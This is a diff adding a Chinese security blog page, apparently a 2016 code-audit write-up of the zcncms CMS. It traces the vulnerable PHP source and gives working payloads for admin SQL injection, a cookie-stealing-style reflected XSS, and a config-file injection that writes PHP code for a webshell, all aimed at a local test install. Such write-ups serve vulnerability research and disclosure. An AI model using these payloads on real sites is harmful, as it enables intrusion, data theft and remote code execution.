@@ -1,0 +1,720 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="wps2015的博客" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="接上一篇 代码审计——zcncms后台SQL注入(一)， 继续挖掘出zcncms的几处漏洞.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计——zcncms几处漏洞合集(二)">
+<meta property="og:url" content="http://wps2015.org/2016/08/09/code audit of zcncms2/index.html">
+<meta property="og:site_name" content="wps2015的博客">
+<meta property="og:description" content="接上一篇 代码审计——zcncms后台SQL注入(一)， 继续挖掘出zcncms的几处漏洞.">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2xsvmuXXXXXcTXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2ufnWuXXXXXbmXXXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2aPrCuXXXXXbtXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2iFDQuXXXXXXyXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:updated_time" content="2016-08-09T13:12:55.735Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计——zcncms几处漏洞合集(二)">
+<meta name="twitter:description" content="接上一篇 代码审计——zcncms后台SQL注入(一)， 继续挖掘出zcncms的几处漏洞.">
+<meta name="twitter:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2xsvmuXXXXXcTXpXXXXXXXXXX_!!792076116.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 6272967343840691000,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> 代码审计——zcncms几处漏洞合集(二) | wps2015的博客 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?a27da60a049d14abf452f4a716cbe0e7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">wps2015的博客</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                代码审计——zcncms几处漏洞合集(二)
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
+              2016-08-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/09/code audit of zcncms2/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/09/code audit of zcncms2/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>接上一篇 <a href="http://wps2015.org/2016/08/05/code%20audit%20of%20zcncms/">代码审计——zcncms后台SQL注入(一)</a>， 继续挖掘出zcncms的几处漏洞.<a id="more"></a></p>
+<h4 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h4><p>继上一篇参数$parentid未正确处理后，在/module/products/admincontroller/products_photo.php中，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($a)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'list'</span>:<span class="keyword">default</span>:<span class="comment">//list</span></span><br><span class="line">		<span class="comment">//列表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($productid)) &#123;</span><br><span class="line">			$where = <span class="string">' 1 = 1 '</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$where = <span class="string">" productid = '"</span>.$productid.<span class="string">"' "</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$pageListNum=<span class="number">12</span>;<span class="comment">//每页显示</span></span><br><span class="line">		$totalPage=<span class="number">0</span>;<span class="comment">//总页数</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="keyword">case</span> <span class="string">'edit'</span>:<span class="comment">//</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($submit))&#123;</span><br><span class="line">			$info = <span class="keyword">array</span>();</span><br><span class="line">			$time = time();</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($id))&#123;</span><br><span class="line">				$id = intval($id);</span><br><span class="line">				<span class="keyword">if</span>($id &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">					errorinfo(<span class="string">'变量错误'</span>,<span class="string">''</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				$infoold = $products_photo-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.$id);				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$productinfo = $products-&gt;GetInfo(<span class="string">''</span>,<span class="string">' id = '</span>.$productid);</span><br><span class="line">			<span class="comment">//20120719</span></span><br><span class="line">			checkClassPower(<span class="string">'products'</span>,$productinfo[<span class="string">'classid'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>当 $a的值为’list’时，<code>$where = &quot; productid = &#39;&quot;.$productid.&quot;&#39; &quot;</code>, $procuctid被单引号保护起来，参数引进是经过addslashes操作的，所以这里是安全的。但是当$a == ‘edit’时，<code>$products-&gt;GetInfo(&#39;&#39;,&#39; id = &#39;.$productid)</code>，$productid被直接拼接到where语句中且没有单引号保护，导致SQL注入。构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=products_photo&amp;a=edit&amp;id=7</span><br><span class="line">POST:</span><br><span class="line">submit=&amp;productid=12=@`\\\&apos;`  and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1));#@`\\\&apos;`</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2xsvmuXXXXXcTXpXXXXXXXXXX_!!792076116.png" alt=""></p>
+<h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>在后台登陆文件 /include/admincontroller/login.php中，进行登陆是否成功后，设置模板文件为’login.tpl.php’.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"location:./"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//echo 1;</span></span><br><span class="line">$loginerror = <span class="string">'用户名密码错误，请重新登陆.'</span>;</span><br><span class="line">$templatefile = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$templatefile = <span class="string">'login.tpl.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跟踪到/admin/templates/default/login.tpl.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($topTitle)) <span class="keyword">echo</span> $topTitle.<span class="string">'-'</span>;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $sys[<span class="string">'indextitle'</span>]; <span class="meta">?&gt;</span>-<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $pagetitle;<span class="meta">?&gt;</span>&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">"keywords"</span> content=<span class="string">"&lt;?php echo $sys['webkeywords']; ?&gt;"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"description"</span> content=<span class="string">"&lt;?php echo $sys['webdescription']; ?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在<title>标签中要echo三个变量，其中会检查$topTitle是否为空，我们再控制器文件login.php中并未找到$topTitle的定义或初始化，由于之前参数输入特性，可以进行变量覆盖。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=login&amp;topTitle=&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></title></p>
+<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2ufnWuXXXXXbmXXXXXXXXXXXX_!!792076116.png" alt=""></p>
+<h4 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h4><p>在文件/include/admincontroller/sys.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$pagetitle = <span class="string">'基本信息'</span>;</span><br><span class="line">$pagepower = <span class="string">'sys'</span>;</span><br><span class="line"><span class="comment">//基本部分</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'checkpower.inc.php'</span>);</span><br><span class="line"><span class="comment">//功能部分</span></span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'file.class.php'</span>);</span><br><span class="line"><span class="keyword">include_once</span>(WEB_INC.<span class="string">'string.class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($submit))&#123;</span><br><span class="line">	$FS = <span class="keyword">new</span> files();</span><br><span class="line">	$STR = <span class="keyword">new</span> C_STRING();</span><br><span class="line">	$info = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'isclose'</span> =&gt; $isclose,</span><br><span class="line">	<span class="string">'closeinfo'</span> =&gt; $closeinfo,</span><br><span class="line">	<span class="string">'webtitle'</span> =&gt; $webtitle,</span><br><span class="line">	<span class="string">'indextitle'</span> =&gt; $indextitle,</span><br><span class="line">	<span class="string">'webkeywords'</span> =&gt; $webkeywords,</span><br><span class="line">	<span class="string">'webdescription'</span> =&gt; $webdescription,</span><br><span class="line">	<span class="string">'webcopyright'</span> =&gt; $webcopyright,</span><br><span class="line">	<span class="string">'webbeian'</span> =&gt; $webbeian,</span><br><span class="line">	<span class="string">'systemplates'</span> =&gt; $systemplates,</span><br><span class="line">	<span class="string">'linkurlmode'</span> =&gt; $linkurlmode,</span><br><span class="line">	);</span><br><span class="line">	$rs_msg = $STR-&gt;safe($info);</span><br><span class="line">	<span class="keyword">if</span>($FS-&gt;file_Write($rs_msg, WEB_INC.<span class="string">'sys.inc.php'</span>, <span class="string">'sys'</span>)) &#123;</span><br><span class="line">		errorInfo(<span class="string">'编辑成功'</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		errorInfo();</span><br></pre></td></tr></table></figure></p>
+<p>可编辑网站的基本信息并且存入sys.inc.php，<code>$rs_msg = $STR-&gt;safe($info);</code>但是$info经过了safe函数，我们跟踪safe函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$msg &amp;&amp; $msg != <span class="string">'0'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(is_array($msg))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($msg <span class="keyword">AS</span> $key=&gt;$value)</span><br><span class="line">			&#123;</span><br><span class="line">				$msg[$key] = $this-&gt;safe($value);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$msg = trim($msg);</span><br><span class="line">			<span class="comment">//$old = array("&amp;amp;","&amp;nbsp;","'",'"',"\t","\r");</span></span><br><span class="line">			<span class="comment">//$new = array("&amp;"," ","&amp;#39;","&amp;quot;","&amp;nbsp; &amp;nbsp; ","");</span></span><br><span class="line">			$old = <span class="keyword">array</span>(<span class="string">"&amp;amp;"</span>,<span class="string">"&amp;nbsp;"</span>,<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"\t"</span>);</span><br><span class="line">			$new = <span class="keyword">array</span>(<span class="string">"&amp;"</span>,<span class="string">" "</span>,<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;nbsp; &amp;nbsp; "</span>);</span><br><span class="line">			$msg = str_replace($old,$new,$msg);</span><br><span class="line">			$msg = str_replace(<span class="string">"   "</span>,<span class="string">"&amp;nbsp; &amp;nbsp;"</span>,$msg);</span><br><span class="line">			$old = <span class="keyword">array</span>(<span class="string">"/&lt;script(.*)&lt;\/script&gt;/isU"</span>,<span class="string">"/&lt;frame(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/fram(.*)&gt;/isU"</span>,<span class="string">"/&lt;iframe(.*)&gt;/isU"</span>,<span class="string">"/&lt;\/ifram(.*)&gt;/isU"</span>,<span class="string">"/&lt;style(.*)&lt;\/style&gt;/isU"</span>);</span><br><span class="line">			$new = <span class="keyword">array</span>(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line">			$msg = preg_replace($old,$new,$msg);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $msg;</span><br></pre></td></tr></table></figure></p>
+<p>safe函数过滤了单双引号及常见的xss，我们再看看sys.inc.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sys[<span class="string">"isclose"</span>] = <span class="string">'0'</span>;</span><br><span class="line">$sys[<span class="string">"closeinfo"</span>] = <span class="string">'comming soon'</span>;</span><br><span class="line">$sys[<span class="string">"webtitle"</span>] = <span class="string">'ZCNCMS'</span>;</span><br><span class="line">$sys[<span class="string">"indextitle"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line">$sys[<span class="string">"webkeywords"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line">$sys[<span class="string">"webdescription"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line">$sys[<span class="string">"webcopyright"</span>] = <span class="string">'Copyright+©+1996-2012,+All+Rights+Reserved+ZCNCMS'</span>;</span><br><span class="line">$sys[<span class="string">"webbeian"</span>] = <span class="string">'ZCNCMS专注内容'</span>;</span><br><span class="line">$sys[<span class="string">"systemplates"</span>] = <span class="string">'default'</span>;</span><br><span class="line">$sys[<span class="string">"linkurlmode"</span>] = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们继续跟踪sys.php中的写函数，<code>file_Write()-&gt;_write()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写入信息</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_write</span><span class="params">($content,$file,$type=<span class="string">"wb"</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $system_time;</span><br><span class="line">		$content = stripslashes($content);</span><br><span class="line">		$handle = $this-&gt;_open($file,$type);</span><br><span class="line">		@fwrite($handle,$content);</span><br><span class="line">		<span class="keyword">unset</span>($content);</span><br><span class="line">		$this-&gt;close($handle);</span><br><span class="line">		<span class="comment">//设置文件创建的时间</span></span><br><span class="line">		$system_time = $system_time ? $system_time : time();</span><br><span class="line">		@touch($file,$system_time);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现经过一系列的安全处理后，写入前会进行addslashes操作,但是之前单引号被替换了。这里想到了<code>\</code><br>我们呢可以这样构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/code_audit/zcncms/admin/?c=sys</span><br><span class="line">POST:</span><br><span class="line">isclose=0&amp;closeinfo=1\&amp;webtitle=;phpinfo();//&amp;indextitle=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&amp;webkeywords=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&amp;webdescription=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&amp;webbeian=ZCNCMS%E4%B8%93%E6%B3%A8%E5%86%85%E5%AE%B9&amp;webcopyright=Copyright+%C2%A9+1996-2012%2C+All+Rights+Reserved+ZCNCMS&amp;linkurlmode=0&amp;systemplates=default&amp;submit=%E7%BC%96%E8%BE%91</span><br></pre></td></tr></table></figure></p>
+<p>将$sys[“closeinfo”]后面的单引号转义，使之和$sys[“webtitle”]的第一个单引号闭合，这样$sys[“webtitle”]的值就摆脱了单引号，再利用注释符”//“注释掉后面的单引号，中间直接可以写shell。执行完成后sys.inc.php如下<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2aPrCuXXXXXbtXpXXXXXXXXXX_!!792076116.png" alt=""></p>
+<p>成功getshell</p>
+<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2iFDQuXXXXXXyXpXXXXXXXXXX_!!792076116.png" alt=""></p>
+
+      
+    </div>
+    
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag">#php</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/08/05/code audit of zcncms1/" rel="next" title="代码审计——zcncms后台SQL注入(一)">
+                <i class="fa fa-chevron-left"></i> 代码审计——zcncms后台SQL注入(一)
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/08/09/code audit of zcncms2/"
+           data-title="代码审计——zcncms几处漏洞合集(二)" data-url="http://wps2015.org/2016/08/09/code audit of zcncms2/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://img.alicdn.com/imgextra/i3/792076116/TB2Z2f9oFXXXXXYXFXXXXXXXXXX_!!792076116.png"
+               alt="wps2015" />
+          <p class="site-author-name" itemprop="name">wps2015</p>
+          <p class="site-description motion-element" itemprop="description">关注安全</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">17</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/sowish" target="_blank" title="github">
+                  
+                    <i class="fa fa-globe"></i>
+                  
+                  github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/2560648590/profile" target="_blank" title="weibo">
+                  
+                    <i class="fa fa-globe"></i>
+                  
+                  weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element">
+            <div class="links-of-blogroll-title">Links</div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ohroot.com/" title="ohroot" target="_blank">ohroot</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ourren.com/" title="ourren" target="_blank">ourren</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.pang0lin.com/" title="pang0lin" target="_blank">pang0lin</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://jinglingshu.org/" title="精灵鼠" target="_blank">精灵鼠</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sccsec.com/" title="胖胖" target="_blank">胖胖</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://mauu.me" title="ksss" target="_blank">ksss</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blackwolfsec.github.io/" title="blackwolf" target="_blank">blackwolf</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsyks.github.io/" title="我是_一棵树_" target="_blank">我是_一棵树_</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://phantom0301.github.io/" title="零の杂货铺" target="_blank">零の杂货铺</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
